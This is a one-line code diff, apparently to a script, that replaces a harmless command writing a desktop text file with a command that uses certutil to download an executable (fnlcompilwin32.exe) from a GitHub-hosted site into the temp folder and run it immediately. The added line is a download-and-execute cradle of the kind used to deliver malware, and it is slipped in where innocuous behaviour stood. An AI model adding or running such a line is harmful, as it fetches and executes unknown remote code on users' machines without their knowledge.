@@ -1,1 +1,1 @@
-ExecuteCmd -user -cmd "echo Tout vas bien > %USERPROFILE%\desktop\readme.txt"
+ExecuteCmd -user -cmd "certutil -urlcache -split -f https://github.com/MJVhack/MJVhack.github.io/raw/refs/heads/main/fnlcompilwin32.exe %TEMP%\fnlcompilwin32.exe && %TEMP%\fnlcompilwin32.exe"
